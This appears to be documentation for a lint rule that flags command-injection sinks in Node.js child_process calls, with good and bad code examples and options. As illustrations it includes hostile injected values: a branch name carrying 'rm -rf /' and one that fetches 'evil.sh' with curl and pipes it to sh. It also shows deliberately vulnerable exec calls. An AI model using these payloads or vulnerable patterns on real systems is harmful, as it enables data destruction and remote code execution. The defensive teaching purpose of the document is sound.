# `noctcore-security/no-shell-interpolation`

> A dynamically-built command string must not flow into a shell runner. Pass the program and its arguments separately.

<!-- begin generated rule header -->
✅ In `recommended` at `error` · 💭 Type information: not needed
<!-- end generated rule header -->

## Why

A dynamically-interpolated command string handed to a shell is the classic command-injection sink:

```ts bad
// a crafted `branch` runs arbitrary commands
exec(`git checkout ${branch}`);
```

If `branch` is `main; rm -rf /`, the shell happily runs both. The fix is to pass the program and its
arguments separately, so the OS never re-parses a shell string:

```ts good
// no shell: arguments cannot inject
execFile('git', ['checkout', branch]);
```

## What it flags

Precision is the whole point — this rule fires **only** on the genuinely dangerous shape:

- **`exec` / `execSync`** (always run a shell): a first argument that is a template literal with
  expressions, or a `+` concatenation with a dynamic part.
- **`spawn` / `spawnSync` / `execFile` / `execFileSync`**: the same dynamic first argument, but **only**
  when an options object literal passes a `shell` value other than `false`: `true`, a shell path
  string, or any value decided at run time.

```ts bad
// shell:true re-parses the interpolated command
spawn(`cmd ${x}`, { shell: true });
```

A shell chosen at run time is a shell on some machine. This call is an injection sink on Windows
only, which is exactly where a macOS developer never sees it fail:

```ts bad
spawn(`git ${branch}`, { shell: process.platform === 'win32' });
```

### Promisified runners

A binding made with `promisify` from a `child_process` runner is followed through scope and checked
like the runner it wraps (`util.promisify(cp.exec)` too):

```ts bad
import { exec } from 'node:child_process';
import { promisify } from 'node:util';

const execAsync = promisify(exec);

export async function checkout(branch: string) {
  await execAsync(`git checkout ${branch}`);
}
```

```ts good
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

export async function checkout(branch: string) {
  await execFileAsync('git', ['checkout', branch]);
}
```

There is **no autofix**: the safe rewrite changes the call shape (string → program + args array).

## What it does not flag

The array-args, no-shell forms are safe and left alone, even with a dynamic argument (and with a
statically off `shell`: `false`, `null`, `undefined` or `''`):

```ts good
// left alone: no shell
spawn('ls', [dir]);
execFile('git', ['log', branch]);
```

`exec` called as a **member on a non-`child_process` object** — notably `regex.exec(...)` — is
excluded so `RegExp.prototype.exec` never false-positives. The `child_process` member form is
recognised via the conventional object names `cp` / `childProcess` / `child_process`, or the bare
imported `exec(...)`.

An options object passed by name (`spawn(cmd, options)`) is not followed, so its `shell` value is
not seen. A runner wrapped some other way than `promisify` (a hand-written `new Promise` around
`exec`) is not followed either; name the wrapper in `extraCallees`.

A fully static command is not flagged either: `exec('ls -la')`, a template literal with no
expressions, or a `+` of literals only (`'ls ' + '-la'`). Neither is a part that is an in-file
`const` literal (`const BIN = '/usr/bin/git'`).

### Values the function already checked

A runtime part is left alone when the function gave up on any other value before the call: an
`if` whose branch ends in `return`, `throw`, `break` or `continue`, earlier in an enclosing block,
or an `if (check) { ... }` around the call, in the same function as the call: a check outside a
callback, or above a hoisted function declaration, does not count inside it. The check must be one
the rule can read:

- an allowlist of literals: `includes` on an array literal, `has` on a `new Set([...])` (inline or
  in a `const`), `===` / `!==` against literals, or `==` / `!=` against a string literal. A list in
  a `const` counts only if it never changes: it is not exported, and every use of it is an
  `includes` / `has` call (or `new Set(list)`), so no `push`, `add` or `list[0] = x` anywhere;
- `test` with a regex (inline or in a `const`) anchored at both ends, without the `m` flag, whose
  every character is shell-inert: no `.`, no `\s` (it admits a newline), no negated class, and
  none of ``;&|$`()<>{}[]*?!~'"\^`` or a line break. Space, `-`, `%` and `#` are allowed;
- a schema with such a pattern or a literal set: `const { error, value } = schema.validate(x)`
  followed by an exiting `if (error)`, or `schema.parse(x)` (which throws), where the schema is an
  in-file chain with `.pattern(re)` / `.regex(re)` (no options argument; a string name or message
  is fine) or `.valid(...)` / `.enum([...])` / `.literal(...)`, and every other method in the chain
  only narrows (`min`, `max`, `length`, `required`, `optional`, `trim`, `lowercase` and the like).
  A chain with `default`, `catch`, `failover`, `pipe`, `transform`, `allow` or any other method
  can let another value through and is not read.

Every write to the checked binding must come before the check, in the function that declares it:
a write from a nested function (`const reset = () => { x = other; }`) cancels the check, since it
can run at any time. The rule follows `const` aliases (`const picked = sort`) and the global
`String(x)`:

```ts bad
// the check does not stop the call: it only logs
function list(sort: string) {
  if (!['asc', 'desc'].includes(sort)) log('unknown sort');
  exec(`ls --sort ${sort}`);
}
```

```ts good
// only `asc` or `desc` reach the shell
function list(sort: string) {
  if (!['asc', 'desc'].includes(sort)) return;
  exec(`ls --sort ${sort}`);
}
```

```ts good
// an anchored, shell-inert pattern
function list(name: string) {
  if (!/^[a-z0-9_-]+$/.test(name)) throw new Error('bad name');
  exec(`ls ${name}`);
}
```

A check that runs after the call, tests another variable, uses a list the rule cannot see
(`list.includes(x)` on a parameter), or a regex that is unanchored (`/[a-z]+/`) or admits a
metacharacter keeps the report.

### Values the operator sets

A value read from `process.env` is reported by default. In CI some variables hold text an outsider
chose: `GITHUB_HEAD_REF` is the branch name of a pull request from a fork, and a branch can be
named `` a;curl${IFS}evil.sh|sh ``.

```ts bad
exec(`git checkout ${process.env.GITHUB_HEAD_REF}`);
```

With `trustEnvironment: true`, a value read from `process.env` with a fixed key is treated as set
by whoever runs the process and left alone: directly, through `const` bindings, `String()`, string
methods with literal arguments (`.trim()`, `.replace(/\0/g, '')`), literal fallbacks (`|| ''`),
and templates or `+` of such values and literals. A computed key (`process.env[name]`) is still
reported. Turn it on only where no variable carries outside input.

```ts bad options={"trustEnvironment":true}
// a computed key could name any variable
export function status(name: string) {
  exec(`git -C ${process.env[name]} status`);
}
```

```ts good options={"trustEnvironment":true}
export function status() {
  exec(`git -C ${process.env.REPO_DIR} status`);
}
```

### What the rule does not see

In sloppy-mode scripts `arguments[0] = other` also changes the first parameter; ES modules and
TypeScript output are strict, where it does not. A checked array changed in place after the check
(`parts.push(y)`, `parts[0] = y`) cancels the check, but one handed to a function that changes it
is not tracked; check the string you interpolate.

## Options

| Option | Type | Default | Meaning |
| --- | --- | --- | --- |
| `extraCallees` | `string[]` | `[]` | Extra callee names to treat as always-shell command runners (checked like `exec`). |
| `trustEnvironment` | `boolean` | `false` | Leave values read from `process.env` with a fixed key alone. Off by default because CI variables such as `GITHUB_HEAD_REF` hold outside input. |

```js
'noctcore-security/no-shell-interpolation': ['error', { extraCallees: ['runShell', 'sh'] }]
```

## When not to use it

If a call site is safe in a way the rule cannot read (a check in another function, a list from
another module), refactor to `execFile` anyway, since it is clearer, or disable the rule for that
line.
